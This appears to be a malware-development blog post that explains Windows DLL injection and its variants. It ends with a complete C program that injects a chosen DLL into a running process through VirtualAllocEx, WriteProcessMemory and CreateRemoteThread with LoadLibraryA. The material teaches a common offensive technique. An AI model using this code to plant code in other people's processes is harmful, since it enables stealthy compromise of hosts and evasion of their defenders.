---
layout: single
title: "Payload Unleashed: DLL Injection"
date: 2024-02-28
classes: wide
header:
  teaser: /assets/images/maldev.png
categories:
  - infosec
tags:
  - windows
  - malware
---

Dynamic Link Library (DLL) injection is a technique used in the realm of software development and cybersecurity. It involves inserting a DLL into the address space of a running process, thereby altering its behavior or extending its functionality. While primarily used for legitimate purposes such as debugging and system monitoring, DLL injection can also be leveraged for malicious activities like code execution and privilege escalation. 

In this blog post, we'll delve into the workings of DLL injection, its various types, and which nasty things can we do with it.

# Understanding DLL Injection

At its core, DLL injection is about injecting external code into the memory space of a running process. This allows the injected code to execute within the context of the target process, granting it access to resources and functionalities it wouldn't normally have. The injection process typically involves the following steps:

1. **Selection of Target Process**: The first step is to identify the process into which the DLL will be injected. This could be any running application or system process.
    
2. **Loading the DLL**: The DLL to be injected is loaded into the memory space of the target process. This can be achieved through various means, including using APIs like LoadLibrary or manually mapping the DLL into memory. We will address this techniques later. 
    
3. **Injection**: Once the DLL is loaded into the target process, the next step is to execute its code within that process. This is often achieved by creating a remote thread within the target process and directing it to execute a specific function within the injected DLL.

# Types of DLL Injection

DLL injection techniques can be classified into several categories, each with its own advantages and use cases. Some common types include:

1. **Load-time Injection**: In load-time injection, the DLL is loaded into the target process's address space at the time of process creation. This can be achieved by specifying the DLL in the process's import table or by modifying the process's environment variables to include the DLL's path.
    
2. **Run-time Injection**: Run-time injection involves injecting the DLL into a running process. This can be done using APIs like CreateRemoteThread or by directly modifying the target process's memory space to load the DLL.
    
3. **Reflective Injection**: Reflective injection is a more advanced technique where the injected DLL is capable of loading and executing itself without relying on the traditional Windows DLL loading mechanisms. This makes it harder to detect and trace compared to other injection methods. 
    
4. **Code Injection**: In code injection, rather than injecting an entire DLL, small snippets of code are injected into the target process. This code is then executed within the context of the process, allowing for more granular control over its behavior.

# Hands-On: Implementing DLL Injection in C

In this hands-on section, we'll explore how to implement DLL injection using C code. We'll focus on run-time injection, which involves injecting a DLL into a running process. For this demonstration, we'll create a simple console application to perform the injection.

## Overall process

 First, we need to open a handle to the target process to enable access to its memory space. Then, we reserve space within the target process to store the path of the DLL to be injected. Subsequently, the DLL path is written into this allocated memory space. Finally, a new thread is created within the target process, with its execution directed to a function that loads the DLL into the process's memory space. As a result, the injected DLL becomes part of the target process's execution, enabling it to modify the process's behavior or extend its functionality as desired. In the following section we will see which WinAPI functions do we need to perform such tasks. 

##   WinAPI Functions

- [**CreateToolhelp32Snapshot()**](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot): This function is used to create a snapshot of the current system's processes, allowing us to enumerate and find the target process by name.

- [**Process32First()**](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32first) and [**Process32Next()**](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32next): These functions are used to retrieve information about processes in the system, allowing us to iterate through the processes obtained from the snapshot to find the target process by name.

- [**OpenProcess()**](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess): This function opens an existing process object, which is necessary to perform operations such as memory allocation and writing within the target process.

- [**VirtualAllocEx()**](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex): Used to allocate memory within the address space of a specified process, allowing us to reserve space in the target process to store the path of the DLL to be injected.

- [**WriteProcessMemory()**](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory): This function writes data to an area of memory in a specified process, enabling us to write the path of the DLL into the allocated memory space within the target process.

- [**GetModuleHandle()**](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea) and [**GetProcAddress()**](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress): GetModuleHandle retrieves handles to modules, and GetProcAddress retrieves the addresses of exported functions from specified modules, respectively. In this case, they are used to obtain the handle to kernel32.dll and the address of the LoadLibraryA function within kernel32.dll, allowing us to load the DLL into the target process.

- [**CreateRemoteThread()**](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread): This function creates a thread in the address space of another process and begins its execution. We use it to create a remote thread within the target process to execute the LoadLibraryA function, effectively loading the DLL into the target process.


```c
#include <windows.h>
#include <stdio.h>

int main() {
    char* targetProcessName = "targetProcess.exe"; // Change this to the name of the target process

    // Find the target process by name
    HANDLE hProcess = NULL;
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("Error: Unable to create process snapshot.\n");
        return 1;
    }

    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (strcmp(pe32.szExeFile, targetProcessName) == 0) {
                hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
                if (hProcess != NULL) {
                    break;
                }
            }
        } while (Process32Next(hSnapshot, &pe32));
    }

    if (hProcess == NULL) {
        printf("Error: Target process not found.\n");
        CloseHandle(hSnapshot);
        return 1;
    }

    CloseHandle(hSnapshot);

    // Allocate memory for the DLL path in the target process
    char* dllPath = "C:\\path\\to\\your\\injected.dll"; // Change this to the path of your DLL
    LPVOID allocMemAddr = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
    if (allocMemAddr == NULL) {
        printf("Error: Failed to allocate memory in target process.\n");
        CloseHandle(hProcess);
        return 1;
    }

    // Write the DLL path into the target process's memory
    if (!WriteProcessMemory(hProcess, allocMemAddr, dllPath, strlen(dllPath) + 1, NULL)) {
        printf("Error: Failed to write DLL path into target process's memory.\n");
        VirtualFreeEx(hProcess, allocMemAddr, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    // Load kernel32.dll and get the address of LoadLibraryA
    HMODULE hKernel32 = GetModuleHandle("kernel32.dll");
    if (hKernel32 == NULL) {
        printf("Error: Failed to get handle to kernel32.dll.\n");
        VirtualFreeEx(hProcess, allocMemAddr, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    LPVOID loadLibraryAddr = GetProcAddress(hKernel32, "LoadLibraryA");
    if (loadLibraryAddr == NULL) {
        printf("Error: Failed to get address of LoadLibraryA.\n");
        VirtualFreeEx(hProcess, allocMemAddr, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    // Create remote thread in the target process to load the DLL
    HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddr, allocMemAddr, 0, NULL);
    if (hRemoteThread == NULL) {
        printf("Error: Failed to create remote thread in target process.\n");
        VirtualFreeEx(hProcess, allocMemAddr, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    printf("DLL injected successfully.\n");

    // Clean up
    WaitForSingleObject(hRemoteThread, INFINITE);
    VirtualFreeEx(hProcess, allocMemAddr, 0, MEM_RELEASE);
    CloseHandle(hRemoteThread);
    CloseHandle(hProcess);

    return 0;
}
```

Replace `"targetProcess.exe"` with the name of the target process you want to inject the DLL into, and `"C:\\path\\to\\your\\injected.dll"` with the path to the DLL you want to inject.